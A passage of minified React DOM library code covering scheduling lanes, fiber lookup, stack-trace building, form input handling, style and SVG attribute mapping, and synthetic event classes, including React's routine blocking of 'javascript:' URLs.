	function bu(l) {
		I.current === l && (M(U), M(I)),
			Wl.current === l && (M(Wl), (ou._currentValue = q));
	}
	var qn = Object.prototype.hasOwnProperty,
		wn = N.unstable_scheduleCallback,
		Yn = N.unstable_cancelCallback,
		fd = N.unstable_shouldYield,
		sd = N.unstable_requestPaint,
		pt = N.unstable_now,
		rd = N.unstable_getCurrentPriorityLevel,
		uf = N.unstable_ImmediatePriority,
		nf = N.unstable_UserBlockingPriority,
		pu = N.unstable_NormalPriority,
		od = N.unstable_LowPriority,
		cf = N.unstable_IdlePriority,
		dd = N.log,
		hd = N.unstable_setDisableYieldValue,
		ba = null,
		$l = null;
	function Lt(l) {
		if (
			(typeof dd == "function" && hd(l),
			$l && typeof $l.setStrictMode == "function")
		)
			try {
				$l.setStrictMode(ba, l);
			} catch {}
	}
	var Fl = Math.clz32 ? Math.clz32 : yd,
		md = Math.log,
		vd = Math.LN2;
	function yd(l) {
		return (l >>>= 0), l === 0 ? 32 : (31 - ((md(l) / vd) | 0)) | 0;
	}
	var Su = 256,
		Tu = 4194304;
	function ve(l) {
		var t = l & 42;
		if (t !== 0) return t;
		switch (l & -l) {
			case 1:
				return 1;
			case 2:
				return 2;
			case 4:
				return 4;
			case 8:
				return 8;
			case 16:
				return 16;
			case 32:
				return 32;
			case 64:
				return 64;
			case 128:
				return 128;
			case 256:
			case 512:
			case 1024:
			case 2048:
			case 4096:
			case 8192:
			case 16384:
			case 32768:
			case 65536:
			case 131072:
			case 262144:
			case 524288:
			case 1048576:
			case 2097152:
				return l & 4194048;
			case 4194304:
			case 8388608:
			case 16777216:
			case 33554432:
				return l & 62914560;
			case 67108864:
				return 67108864;
			case 134217728:
				return 134217728;
			case 268435456:
				return 268435456;
			case 536870912:
				return 536870912;
			case 1073741824:
				return 0;
			default:
				return l;
		}
	}
	function Eu(l, t, e) {
		var a = l.pendingLanes;
		if (a === 0) return 0;
		var u = 0,
			n = l.suspendedLanes,
			c = l.pingedLanes;
		l = l.warmLanes;
		var i = a & 134217727;
		return (
			i !== 0
				? ((a = i & ~n),
				  a !== 0
						? (u = ve(a))
						: ((c &= i),
						  c !== 0
								? (u = ve(c))
								: e || ((e = i & ~l), e !== 0 && (u = ve(e)))))
				: ((i = a & ~n),
				  i !== 0
						? (u = ve(i))
						: c !== 0
						? (u = ve(c))
						: e || ((e = a & ~l), e !== 0 && (u = ve(e)))),
			u === 0
				? 0
				: t !== 0 &&
				  t !== u &&
				  (t & n) === 0 &&
				  ((n = u & -u),
				  (e = t & -t),
				  n >= e || (n === 32 && (e & 4194048) !== 0))
				? t
				: u
		);
	}
	function pa(l, t) {
		return (
			(l.pendingLanes & ~(l.suspendedLanes & ~l.pingedLanes) & t) === 0
		);
	}
	function gd(l, t) {
		switch (l) {
			case 1:
			case 2:
			case 4:
			case 8:
			case 64:
				return t + 250;
			case 16:
			case 32:
			case 128:
			case 256:
			case 512:
			case 1024:
			case 2048:
			case 4096:
			case 8192:
			case 16384:
			case 32768:
			case 65536:
			case 131072:
			case 262144:
			case 524288:
			case 1048576:
			case 2097152:
				return t + 5e3;
			case 4194304:
			case 8388608:
			case 16777216:
			case 33554432:
				return -1;
			case 67108864:
			case 134217728:
			case 268435456:
			case 536870912:
			case 1073741824:
				return -1;
			default:
				return -1;
		}
	}
	function ff() {
		var l = Su;
		return (Su <<= 1), (Su & 4194048) === 0 && (Su = 256), l;
	}
	function sf() {
		var l = Tu;
		return (Tu <<= 1), (Tu & 62914560) === 0 && (Tu = 4194304), l;
	}
	function Gn(l) {
		for (var t = [], e = 0; 31 > e; e++) t.push(l);
		return t;
	}
	function Sa(l, t) {
		(l.pendingLanes |= t),
			t !== 268435456 &&
				((l.suspendedLanes = 0),
				(l.pingedLanes = 0),
				(l.warmLanes = 0));
	}
	function xd(l, t, e, a, u, n) {
		var c = l.pendingLanes;
		(l.pendingLanes = e),
			(l.suspendedLanes = 0),
			(l.pingedLanes = 0),
			(l.warmLanes = 0),
			(l.expiredLanes &= e),
			(l.entangledLanes &= e),
			(l.errorRecoveryDisabledLanes &= e),
			(l.shellSuspendCounter = 0);
		var i = l.entanglements,
			s = l.expirationTimes,
			v = l.hiddenUpdates;
		for (e = c & ~e; 0 < e; ) {
			var x = 31 - Fl(e),
				S = 1 << x;
			(i[x] = 0), (s[x] = -1);
			var y = v[x];
			if (y !== null)
				for (v[x] = null, x = 0; x < y.length; x++) {
					var g = y[x];
					g !== null && (g.lane &= -536870913);
				}
			e &= ~S;
		}
		a !== 0 && rf(l, a, 0),
			n !== 0 &&
				u === 0 &&
				l.tag !== 0 &&
				(l.suspendedLanes |= n & ~(c & ~t));
	}
	function rf(l, t, e) {
		(l.pendingLanes |= t), (l.suspendedLanes &= ~t);
		var a = 31 - Fl(t);
		(l.entangledLanes |= t),
			(l.entanglements[a] =
				l.entanglements[a] | 1073741824 | (e & 4194090));
	}
	function of(l, t) {
		var e = (l.entangledLanes |= t);
		for (l = l.entanglements; e; ) {
			var a = 31 - Fl(e),
				u = 1 << a;
			(u & t) | (l[a] & t) && (l[a] |= t), (e &= ~u);
		}
	}
	function Xn(l) {
		switch (l) {
			case 2:
				l = 1;
				break;
			case 8:
				l = 4;
				break;
			case 32:
				l = 16;
				break;
			case 256:
			case 512:
			case 1024:
			case 2048:
			case 4096:
			case 8192:
			case 16384:
			case 32768:
			case 65536:
			case 131072:
			case 262144:
			case 524288:
			case 1048576:
			case 2097152:
			case 4194304:
			case 8388608:
			case 16777216:
			case 33554432:
				l = 128;
				break;
			case 268435456:
				l = 134217728;
				break;
			default:
				l = 0;
		}
		return l;
	}
	function Qn(l) {
		return (
			(l &= -l),
			2 < l ? (8 < l ? ((l & 134217727) !== 0 ? 32 : 268435456) : 8) : 2
		);
	}
	function df() {
		var l = A.p;
		return l !== 0
			? l
			: ((l = window.event), l === void 0 ? 32 : Ko(l.type));
	}
	function bd(l, t) {
		var e = A.p;
		try {
			return (A.p = l), t();
		} finally {
			A.p = e;
		}
	}
	var Zt = Math.random().toString(36).slice(2),
		Cl = "__reactFiber$" + Zt,
		Gl = "__reactProps$" + Zt,
		He = "__reactContainer$" + Zt,
		Ln = "__reactEvents$" + Zt,
		pd = "__reactListeners$" + Zt,
		Sd = "__reactHandles$" + Zt,
		hf = "__reactResources$" + Zt,
		Ta = "__reactMarker$" + Zt;
	function Zn(l) {
		delete l[Cl], delete l[Gl], delete l[Ln], delete l[pd], delete l[Sd];
	}
	function Ce(l) {
		var t = l[Cl];
		if (t) return t;
		for (var e = l.parentNode; e; ) {
			if ((t = e[He] || e[Cl])) {
				if (
					((e = t.alternate),
					t.child !== null || (e !== null && e.child !== null))
				)
					for (l = Do(l); l !== null; ) {
						if ((e = l[Cl])) return e;
						l = Do(l);
					}
				return t;
			}
			(l = e), (e = l.parentNode);
		}
		return null;
	}
	function Be(l) {
		if ((l = l[Cl] || l[He])) {
			var t = l.tag;
			if (
				t === 5 ||
				t === 6 ||
				t === 13 ||
				t === 26 ||
				t === 27 ||
				t === 3
			)
				return l;
		}
		return null;
	}
	function Ea(l) {
		var t = l.tag;
		if (t === 5 || t === 26 || t === 27 || t === 6) return l.stateNode;
		throw Error(h(33));
	}
	function qe(l) {
		var t = l[hf];
		return (
			t ||
				(t = l[hf] =
					{
						hoistableStyles: new Map(),
						hoistableScripts: new Map(),
					}),
			t
		);
	}
	function zl(l) {
		l[Ta] = !0;
	}
	var mf = new Set(),
		vf = {};
	function ye(l, t) {
		we(l, t), we(l + "Capture", t);
	}
	function we(l, t) {
		for (vf[l] = t, l = 0; l < t.length; l++) mf.add(t[l]);
	}
	var Td = RegExp(
			"^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"
		),
		yf = {},
		gf = {};
	function Ed(l) {
		return qn.call(gf, l)
			? !0
			: qn.call(yf, l)
			? !1
			: Td.test(l)
			? (gf[l] = !0)
			: ((yf[l] = !0), !1);
	}
	function Nu(l, t, e) {
		if (Ed(t))
			if (e === null) l.removeAttribute(t);
			else {
				switch (typeof e) {
					case "undefined":
					case "function":
					case "symbol":
						l.removeAttribute(t);
						return;
					case "boolean":
						var a = t.toLowerCase().slice(0, 5);
						if (a !== "data-" && a !== "aria-") {
							l.removeAttribute(t);
							return;
						}
				}
				l.setAttribute(t, "" + e);
			}
	}
	function ju(l, t, e) {
		if (e === null) l.removeAttribute(t);
		else {
			switch (typeof e) {
				case "undefined":
				case "function":
				case "symbol":
				case "boolean":
					l.removeAttribute(t);
					return;
			}
			l.setAttribute(t, "" + e);
		}
	}
	function At(l, t, e, a) {
		if (a === null) l.removeAttribute(e);
		else {
			switch (typeof a) {
				case "undefined":
				case "function":
				case "symbol":
				case "boolean":
					l.removeAttribute(e);
					return;
			}
			l.setAttributeNS(t, e, "" + a);
		}
	}
	var Vn, xf;
	function Ye(l) {
		if (Vn === void 0)
			try {
				throw Error();
			} catch (e) {
				var t = e.stack.trim().match(/\n( *(at )?)/);
				(Vn = (t && t[1]) || ""),
					(xf =
						-1 <
						e.stack.indexOf(`
    at`)
							? " (<anonymous>)"
							: -1 < e.stack.indexOf("@")
							? "@unknown:0:0"
							: "");
			}
		return (
			`
` +
			Vn +
			l +
			xf
		);
	}
	var Kn = !1;
	function Jn(l, t) {
		if (!l || Kn) return "";
		Kn = !0;
		var e = Error.prepareStackTrace;
		Error.prepareStackTrace = void 0;
		try {
			var a = {
				DetermineComponentFrameRoot: function () {
					try {
						if (t) {
							var S = function () {
								throw Error();
							};
							if (
								(Object.defineProperty(S.prototype, "props", {
									set: function () {
										throw Error();
									},
								}),
								typeof Reflect == "object" && Reflect.construct)
							) {
								try {
									Reflect.construct(S, []);
								} catch (g) {
									var y = g;
								}
								Reflect.construct(l, [], S);
							} else {
								try {
									S.call();
								} catch (g) {
									y = g;
								}
								l.call(S.prototype);
							}
						} else {
							try {
								throw Error();
							} catch (g) {
								y = g;
							}
							(S = l()) &&
								typeof S.catch == "function" &&
								S.catch(function () {});
						}
					} catch (g) {
						if (g && y && typeof g.stack == "string")
							return [g.stack, y.stack];
					}
					return [null, null];
				},
			};
			a.DetermineComponentFrameRoot.displayName =
				"DetermineComponentFrameRoot";
			var u = Object.getOwnPropertyDescriptor(
				a.DetermineComponentFrameRoot,
				"name"
			);
			u &&
				u.configurable &&
				Object.defineProperty(a.DetermineComponentFrameRoot, "name", {
					value: "DetermineComponentFrameRoot",
				});
			var n = a.DetermineComponentFrameRoot(),
				c = n[0],
				i = n[1];
			if (c && i) {
				var s = c.split(`
`),
					v = i.split(`
`);
				for (
					u = a = 0;
					a < s.length &&
					!s[a].includes("DetermineComponentFrameRoot");

				)
					a++;
				for (
					;
					u < v.length &&
					!v[u].includes("DetermineComponentFrameRoot");

				)
					u++;
				if (a === s.length || u === v.length)
					for (
						a = s.length - 1, u = v.length - 1;
						1 <= a && 0 <= u && s[a] !== v[u];

					)
						u--;
				for (; 1 <= a && 0 <= u; a--, u--)
					if (s[a] !== v[u]) {
						if (a !== 1 || u !== 1)
							do
								if ((a--, u--, 0 > u || s[a] !== v[u])) {
									var x =
										`
` + s[a].replace(" at new ", " at ");
									return (
										l.displayName &&
											x.includes("<anonymous>") &&
											(x = x.replace(
												"<anonymous>",
												l.displayName
											)),
										x
									);
								}
							while (1 <= a && 0 <= u);
						break;
					}
			}
		} finally {
			(Kn = !1), (Error.prepareStackTrace = e);
		}
		return (e = l ? l.displayName || l.name : "") ? Ye(e) : "";
	}
	function Nd(l) {
		switch (l.tag) {
			case 26:
			case 27:
			case 5:
				return Ye(l.type);
			case 16:
				return Ye("Lazy");
			case 13:
				return Ye("Suspense");
			case 19:
				return Ye("SuspenseList");
			case 0:
			case 15:
				return Jn(l.type, !1);
			case 11:
				return Jn(l.type.render, !1);
			case 1:
				return Jn(l.type, !0);
			case 31:
				return Ye("Activity");
			default:
				return "";
		}
	}
	function bf(l) {
		try {
			var t = "";
			do (t += Nd(l)), (l = l.return);
			while (l);
			return t;
		} catch (e) {
			return (
				`
Error generating stack: ` +
				e.message +
				`
` +
				e.stack
			);
		}
	}
	function nt(l) {
		switch (typeof l) {
			case "bigint":
			case "boolean":
			case "number":
			case "string":
			case "undefined":
				return l;
			case "object":
				return l;
			default:
				return "";
		}
	}
	function pf(l) {
		var t = l.type;
		return (
			(l = l.nodeName) &&
			l.toLowerCase() === "input" &&
			(t === "checkbox" || t === "radio")
		);
	}
	function jd(l) {
		var t = pf(l) ? "checked" : "value",
			e = Object.getOwnPropertyDescriptor(l.constructor.prototype, t),
			a = "" + l[t];
		if (
			!l.hasOwnProperty(t) &&
			typeof e < "u" &&
			typeof e.get == "function" &&
			typeof e.set == "function"
		) {
			var u = e.get,
				n = e.set;
			return (
				Object.defineProperty(l, t, {
					configurable: !0,
					get: function () {
						return u.call(this);
					},
					set: function (c) {
						(a = "" + c), n.call(this, c);
					},
				}),
				Object.defineProperty(l, t, { enumerable: e.enumerable }),
				{
					getValue: function () {
						return a;
					},
					setValue: function (c) {
						a = "" + c;
					},
					stopTracking: function () {
						(l._valueTracker = null), delete l[t];
					},
				}
			);
		}
	}
	function zu(l) {
		l._valueTracker || (l._valueTracker = jd(l));
	}
	function Sf(l) {
		if (!l) return !1;
		var t = l._valueTracker;
		if (!t) return !0;
		var e = t.getValue(),
			a = "";
		return (
			l && (a = pf(l) ? (l.checked ? "true" : "false") : l.value),
			(l = a),
			l !== e ? (t.setValue(l), !0) : !1
		);
	}
	function Au(l) {
		if (
			((l = l || (typeof document < "u" ? document : void 0)),
			typeof l > "u")
		)
			return null;
		try {
			return l.activeElement || l.body;
		} catch {
			return l.body;
		}
	}
	var zd = /[\n"\\]/g;
	function ct(l) {
		return l.replace(zd, function (t) {
			return "\\" + t.charCodeAt(0).toString(16) + " ";
		});
	}
	function kn(l, t, e, a, u, n, c, i) {
		(l.name = ""),
			c != null &&
			typeof c != "function" &&
			typeof c != "symbol" &&
			typeof c != "boolean"
				? (l.type = c)
				: l.removeAttribute("type"),
			t != null
				? c === "number"
					? ((t === 0 && l.value === "") || l.value != t) &&
					  (l.value = "" + nt(t))
					: l.value !== "" + nt(t) && (l.value = "" + nt(t))
				: (c !== "submit" && c !== "reset") ||
				  l.removeAttribute("value"),
			t != null
				? Wn(l, c, nt(t))
				: e != null
				? Wn(l, c, nt(e))
				: a != null && l.removeAttribute("value"),
			u == null && n != null && (l.defaultChecked = !!n),
			u != null &&
				(l.checked =
					u && typeof u != "function" && typeof u != "symbol"),
			i != null &&
			typeof i != "function" &&
			typeof i != "symbol" &&
			typeof i != "boolean"
				? (l.name = "" + nt(i))
				: l.removeAttribute("name");
	}
	function Tf(l, t, e, a, u, n, c, i) {
		if (
			(n != null &&
				typeof n != "function" &&
				typeof n != "symbol" &&
				typeof n != "boolean" &&
				(l.type = n),
			t != null || e != null)
		) {
			if (!((n !== "submit" && n !== "reset") || t != null)) return;
			(e = e != null ? "" + nt(e) : ""),
				(t = t != null ? "" + nt(t) : e),
				i || t === l.value || (l.value = t),
				(l.defaultValue = t);
		}
		(a = a ?? u),
			(a = typeof a != "function" && typeof a != "symbol" && !!a),
			(l.checked = i ? l.checked : !!a),
			(l.defaultChecked = !!a),
			c != null &&
				typeof c != "function" &&
				typeof c != "symbol" &&
				typeof c != "boolean" &&
				(l.name = c);
	}
	function Wn(l, t, e) {
		(t === "number" && Au(l.ownerDocument) === l) ||
			l.defaultValue === "" + e ||
			(l.defaultValue = "" + e);
	}
	function Ge(l, t, e, a) {
		if (((l = l.options), t)) {
			t = {};
			for (var u = 0; u < e.length; u++) t["$" + e[u]] = !0;
			for (e = 0; e < l.length; e++)
				(u = t.hasOwnProperty("$" + l[e].value)),
					l[e].selected !== u && (l[e].selected = u),
					u && a && (l[e].defaultSelected = !0);
		} else {
			for (e = "" + nt(e), t = null, u = 0; u < l.length; u++) {
				if (l[u].value === e) {
					(l[u].selected = !0), a && (l[u].defaultSelected = !0);
					return;
				}
				t !== null || l[u].disabled || (t = l[u]);
			}
			t !== null && (t.selected = !0);
		}
	}
	function Ef(l, t, e) {
		if (
			t != null &&
			((t = "" + nt(t)), t !== l.value && (l.value = t), e == null)
		) {
			l.defaultValue !== t && (l.defaultValue = t);
			return;
		}
		l.defaultValue = e != null ? "" + nt(e) : "";
	}
	function Nf(l, t, e, a) {
		if (t == null) {
			if (a != null) {
				if (e != null) throw Error(h(92));
				if (Hl(a)) {
					if (1 < a.length) throw Error(h(93));
					a = a[0];
				}
				e = a;
			}
			e == null && (e = ""), (t = e);
		}
		(e = nt(t)),
			(l.defaultValue = e),
			(a = l.textContent),
			a === e && a !== "" && a !== null && (l.value = a);
	}
	function Xe(l, t) {
		if (t) {
			var e = l.firstChild;
			if (e && e === l.lastChild && e.nodeType === 3) {
				e.nodeValue = t;
				return;
			}
		}
		l.textContent = t;
	}
	var Ad = new Set(
		"animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(
			" "
		)
	);
	function jf(l, t, e) {
		var a = t.indexOf("--") === 0;
		e == null || typeof e == "boolean" || e === ""
			? a
				? l.setProperty(t, "")
				: t === "float"
				? (l.cssFloat = "")
				: (l[t] = "")
			: a
			? l.setProperty(t, e)
			: typeof e != "number" || e === 0 || Ad.has(t)
			? t === "float"
				? (l.cssFloat = e)
				: (l[t] = ("" + e).trim())
			: (l[t] = e + "px");
	}
	function zf(l, t, e) {
		if (t != null && typeof t != "object") throw Error(h(62));
		if (((l = l.style), e != null)) {
			for (var a in e)
				!e.hasOwnProperty(a) ||
					(t != null && t.hasOwnProperty(a)) ||
					(a.indexOf("--") === 0
						? l.setProperty(a, "")
						: a === "float"
						? (l.cssFloat = "")
						: (l[a] = ""));
			for (var u in t)
				(a = t[u]), t.hasOwnProperty(u) && e[u] !== a && jf(l, u, a);
		} else for (var n in t) t.hasOwnProperty(n) && jf(l, n, t[n]);
	}
	function $n(l) {
		if (l.indexOf("-") === -1) return !1;
		switch (l) {
			case "annotation-xml":
			case "color-profile":
			case "font-face":
			case "font-face-src":
			case "font-face-uri":
			case "font-face-format":
			case "font-face-name":
			case "missing-glyph":
				return !1;
			default:
				return !0;
		}
	}
	var Md = new Map([
			["acceptCharset", "accept-charset"],
			["htmlFor", "for"],
			["httpEquiv", "http-equiv"],
			["crossOrigin", "crossorigin"],
			["accentHeight", "accent-height"],
			["alignmentBaseline", "alignment-baseline"],
			["arabicForm", "arabic-form"],
			["baselineShift", "baseline-shift"],
			["capHeight", "cap-height"],
			["clipPath", "clip-path"],
			["clipRule", "clip-rule"],
			["colorInterpolation", "color-interpolation"],
			["colorInterpolationFilters", "color-interpolation-filters"],
			["colorProfile", "color-profile"],
			["colorRendering", "color-rendering"],
			["dominantBaseline", "dominant-baseline"],
			["enableBackground", "enable-background"],
			["fillOpacity", "fill-opacity"],
			["fillRule", "fill-rule"],
			["floodColor", "flood-color"],
			["floodOpacity", "flood-opacity"],
			["fontFamily", "font-family"],
			["fontSize", "font-size"],
			["fontSizeAdjust", "font-size-adjust"],
			["fontStretch", "font-stretch"],
			["fontStyle", "font-style"],
			["fontVariant", "font-variant"],
			["fontWeight", "font-weight"],
			["glyphName", "glyph-name"],
			["glyphOrientationHorizontal", "glyph-orientation-horizontal"],
			["glyphOrientationVertical", "glyph-orientation-vertical"],
			["horizAdvX", "horiz-adv-x"],
			["horizOriginX", "horiz-origin-x"],
			["imageRendering", "image-rendering"],
			["letterSpacing", "letter-spacing"],
			["lightingColor", "lighting-color"],
			["markerEnd", "marker-end"],
			["markerMid", "marker-mid"],
			["markerStart", "marker-start"],
			["overlinePosition", "overline-position"],
			["overlineThickness", "overline-thickness"],
			["paintOrder", "paint-order"],
			["panose-1", "panose-1"],
			["pointerEvents", "pointer-events"],
			["renderingIntent", "rendering-intent"],
			["shapeRendering", "shape-rendering"],
			["stopColor", "stop-color"],
			["stopOpacity", "stop-opacity"],
			["strikethroughPosition", "strikethrough-position"],
			["strikethroughThickness", "strikethrough-thickness"],
			["strokeDasharray", "stroke-dasharray"],
			["strokeDashoffset", "stroke-dashoffset"],
			["strokeLinecap", "stroke-linecap"],
			["strokeLinejoin", "stroke-linejoin"],
			["strokeMiterlimit", "stroke-miterlimit"],
			["strokeOpacity", "stroke-opacity"],
			["strokeWidth", "stroke-width"],
			["textAnchor", "text-anchor"],
			["textDecoration", "text-decoration"],
			["textRendering", "text-rendering"],
			["transformOrigin", "transform-origin"],
			["underlinePosition", "underline-position"],
			["underlineThickness", "underline-thickness"],
			["unicodeBidi", "unicode-bidi"],
			["unicodeRange", "unicode-range"],
			["unitsPerEm", "units-per-em"],
			["vAlphabetic", "v-alphabetic"],
			["vHanging", "v-hanging"],
			["vIdeographic", "v-ideographic"],
			["vMathematical", "v-mathematical"],
			["vectorEffect", "vector-effect"],
			["vertAdvY", "vert-adv-y"],
			["vertOriginX", "vert-origin-x"],
			["vertOriginY", "vert-origin-y"],
			["wordSpacing", "word-spacing"],
			["writingMode", "writing-mode"],
			["xmlnsXlink", "xmlns:xlink"],
			["xHeight", "x-height"],
		]),
		Od =
			/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
	function Mu(l) {
		return Od.test("" + l)
			? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')"
			: l;
	}
	var Fn = null;
	function In(l) {
		return (
			(l = l.target || l.srcElement || window),
			l.correspondingUseElement && (l = l.correspondingUseElement),
			l.nodeType === 3 ? l.parentNode : l
		);
	}
	var Qe = null,
		Le = null;
	function Af(l) {
		var t = Be(l);
		if (t && (l = t.stateNode)) {
			var e = l[Gl] || null;
			l: switch (((l = t.stateNode), t.type)) {
				case "input":
					if (
						(kn(
							l,
							e.value,
							e.defaultValue,
							e.defaultValue,
							e.checked,
							e.defaultChecked,
							e.type,
							e.name
						),
						(t = e.name),
						e.type === "radio" && t != null)
					) {
						for (e = l; e.parentNode; ) e = e.parentNode;
						for (
							e = e.querySelectorAll(
								'input[name="' + ct("" + t) + '"][type="radio"]'
							),
								t = 0;
							t < e.length;
							t++
						) {
							var a = e[t];
							if (a !== l && a.form === l.form) {
								var u = a[Gl] || null;
								if (!u) throw Error(h(90));
								kn(
									a,
									u.value,
									u.defaultValue,
									u.defaultValue,
									u.checked,
									u.defaultChecked,
									u.type,
									u.name
								);
							}
						}
						for (t = 0; t < e.length; t++)
							(a = e[t]), a.form === l.form && Sf(a);
					}
					break l;
				case "textarea":
					Ef(l, e.value, e.defaultValue);
					break l;
				case "select":
					(t = e.value), t != null && Ge(l, !!e.multiple, t, !1);
			}
		}
	}
	var Pn = !1;
	function Mf(l, t, e) {
		if (Pn) return l(t, e);
		Pn = !0;
		try {
			var a = l(t);
			return a;
		} finally {
			if (
				((Pn = !1),
				(Qe !== null || Le !== null) &&
					(mn(),
					Qe && ((t = Qe), (l = Le), (Le = Qe = null), Af(t), l)))
			)
				for (t = 0; t < l.length; t++) Af(l[t]);
		}
	}
	function Na(l, t) {
		var e = l.stateNode;
		if (e === null) return null;
		var a = e[Gl] || null;
		if (a === null) return null;
		e = a[t];
		l: switch (t) {
			case "onClick":
			case "onClickCapture":
			case "onDoubleClick":
			case "onDoubleClickCapture":
			case "onMouseDown":
			case "onMouseDownCapture":
			case "onMouseMove":
			case "onMouseMoveCapture":
			case "onMouseUp":
			case "onMouseUpCapture":
			case "onMouseEnter":
				(a = !a.disabled) ||
					((l = l.type),
					(a = !(
						l === "button" ||
						l === "input" ||
						l === "select" ||
						l === "textarea"
					))),
					(l = !a);
				break l;
			default:
				l = !1;
		}
		if (l) return null;
		if (e && typeof e != "function") throw Error(h(231, t, typeof e));
		return e;
	}
	var Mt = !(
			typeof window > "u" ||
			typeof window.document > "u" ||
			typeof window.document.createElement > "u"
		),
		lc = !1;
	if (Mt)
		try {
			var ja = {};
			Object.defineProperty(ja, "passive", {
				get: function () {
					lc = !0;
				},
			}),
				window.addEventListener("test", ja, ja),
				window.removeEventListener("test", ja, ja);
		} catch {
			lc = !1;
		}
	var Vt = null,
		tc = null,
		Ou = null;
	function Of() {
		if (Ou) return Ou;
		var l,
			t = tc,
			e = t.length,
			a,
			u = "value" in Vt ? Vt.value : Vt.textContent,
			n = u.length;
		for (l = 0; l < e && t[l] === u[l]; l++);
		var c = e - l;
		for (a = 1; a <= c && t[e - a] === u[n - a]; a++);
		return (Ou = u.slice(l, 1 < a ? 1 - a : void 0));
	}
	function _u(l) {
		var t = l.keyCode;
		return (
			"charCode" in l
				? ((l = l.charCode), l === 0 && t === 13 && (l = 13))
				: (l = t),
			l === 10 && (l = 13),
			32 <= l || l === 13 ? l : 0
		);
	}
	function Du() {
		return !0;
	}
	function _f() {
		return !1;
	}
	function Xl(l) {
		function t(e, a, u, n, c) {
			(this._reactName = e),
				(this._targetInst = u),
				(this.type = a),
				(this.nativeEvent = n),
				(this.target = c),
				(this.currentTarget = null);
			for (var i in l)
				l.hasOwnProperty(i) &&
					((e = l[i]), (this[i] = e ? e(n) : n[i]));
			return (
				(this.isDefaultPrevented = (
					n.defaultPrevented != null
						? n.defaultPrevented
						: n.returnValue === !1
				)
					? Du
					: _f),
				(this.isPropagationStopped = _f),
				this
			);
		}
		return (
			D(t.prototype, {
				preventDefault: function () {
					this.defaultPrevented = !0;
					var e = this.nativeEvent;
					e &&
						(e.preventDefault
							? e.preventDefault()
							: typeof e.returnValue != "unknown" &&
							  (e.returnValue = !1),
						(this.isDefaultPrevented = Du));
				},
				stopPropagation: function () {
					var e = this.nativeEvent;
					e &&
						(e.stopPropagation
							? e.stopPropagation()
							: typeof e.cancelBubble != "unknown" &&
							  (e.cancelBubble = !0),
						(this.isPropagationStopped = Du));
				},
				persist: function () {},
				isPersistent: Du,
			}),
			t
		);
	}
	var ge = {
			eventPhase: 0,
			bubbles: 0,
			cancelable: 0,
			timeStamp: function (l) {
				return l.timeStamp || Date.now();
			},
			defaultPrevented: 0,
			isTrusted: 0,
		},
		Ru = Xl(ge),
		za = D({}, ge, { view: 0, detail: 0 }),
		_d = Xl(za),
		ec,
		ac,
		Aa,
		Uu = D({}, za, {
			screenX: 0,
			screenY: 0,
			clientX: 0,
			clientY: 0,
			pageX: 0,
			pageY: 0,
			ctrlKey: 0,
			shiftKey: 0,
			altKey: 0,
			metaKey: 0,
			getModifierState: nc,
			button: 0,
			buttons: 0,
			relatedTarget: function (l) {
				return l.relatedTarget === void 0
					? l.fromElement === l.srcElement
						? l.toElement
						: l.fromElement
					: l.relatedTarget;
			},
			movementX: function (l) {
				return "movementX" in l
					? l.movementX
					: (l !== Aa &&
							(Aa && l.type === "mousemove"
								? ((ec = l.screenX - Aa.screenX),
								  (ac = l.screenY - Aa.screenY))
								: (ac = ec = 0),
							(Aa = l)),
					  ec);
			},
			movementY: function (l) {
				return "movementY" in l ? l.movementY : ac;
			},
		}),
		Df = Xl(Uu),
		Dd = D({}, Uu, { dataTransfer: 0 }),
		Rd = Xl(Dd),
		Ud = D({}, za, { relatedTarget: 0 }),
		uc = Xl(Ud),
		Hd = D({}, ge, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
		Cd = Xl(Hd),
		Bd = D({}, ge, {
			clipboardData: function (l) {
				return "clipboardData" in l
					? l.clipboardData
					: window.clipboardData;
			},
		}),
		qd = Xl(Bd),
		wd = D({}, ge, { data: 0 }),
		Rf = Xl(wd),
		Yd = {
			Esc: "Escape",
			Spacebar: " ",
			Left: "ArrowLeft",
			Up: "ArrowUp",
			Right: "ArrowRight",
			Down: "ArrowDown",
			Del: "Delete",
			Win: "OS",
			Menu: "ContextMenu",
			Apps: "ContextMenu",
			Scroll: "ScrollLock",
			MozPrintableKey: "Unidentified",
		},
		Gd = {
			8: "Backspace",
			9: "Tab",
			12: "Clear",
			13: "Enter",
			16: "Shift",
			17: "Control",
			18: "Alt",
			19: "Pause",
			20: "CapsLock",
			27: "Escape",
			32: " ",
			33: "PageUp",
			34: "PageDown",
			35: "End",
			36: "Home",
			37: "ArrowLeft",
			38: "ArrowUp",
			39: "ArrowRight",
			40: "ArrowDown",
			45: "Insert",
			46: "Delete",
			112: "F1",
			113: "F2",
			114: "F3",
			115: "F4",
			116: "F5",
			117: "F6",
			118: "F7",
